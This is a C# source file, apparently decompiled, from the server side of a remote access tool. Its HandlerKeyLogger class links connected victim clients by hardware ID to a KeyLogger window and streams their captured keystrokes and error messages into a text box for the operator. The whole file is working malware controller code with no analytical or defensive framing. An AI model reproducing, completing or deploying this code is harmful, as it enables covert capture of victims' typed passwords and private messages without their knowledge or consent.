using System;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages
{
	// Token: 0x02000062 RID: 98
	internal class HandlerKeyLogger
	{
		// Token: 0x060001FB RID: 507 RVA: 0x00020870 File Offset: 0x0001EA70
		public static void Read(Clients client, object[] objects)
		{
			string a = (string)objects[1];
			if (!(a == "Connect"))
			{
				if (!(a == "Error"))
				{
					if (!(a == "Log"))
					{
						return;
					}
					if (client.Tag == null)
					{
						client.Disconnect();
						return;
					}
					FormKeyLogger form = (FormKeyLogger)client.Tag;
					form.Invoke(new MethodInvoker(delegate()
					{
						RichTextBox richTextBox = form.richTextBox1;
						richTextBox.Text += (string)objects[2];
						form.richTextBox1.SelectionStart = form.richTextBox1.Text.Length;
						form.richTextBox1.ScrollToCaret();
					}));
					return;
				}
				else
				{
					if (client.Tag == null)
					{
						client.Disconnect();
						return;
					}
					FormKeyLogger form = (FormKeyLogger)client.Tag;
					form.Invoke(new MethodInvoker(delegate()
					{
						RichTextBox richTextBox = form.richTextBox1;
						richTextBox.Text = richTextBox.Text + "Error: " + (string)objects[2] + "\n";
					}));
					return;
				}
			}
			else
			{
				FormKeyLogger form = (FormKeyLogger)Application.OpenForms["KeyLogger:" + (string)objects[2]];
				if (form == null)
				{
					client.Disconnect();
					return;
				}
				form.Invoke(new MethodInvoker(delegate()
				{
					form.Text = "KeyLogger [" + (string)objects[2] + "]";
					form.client = client;
					form.richTextBox1.Enabled = true;
				}));
				client.Tag = form;
				client.Hwid = (string)objects[2];
				return;
			}
		}
	}
}
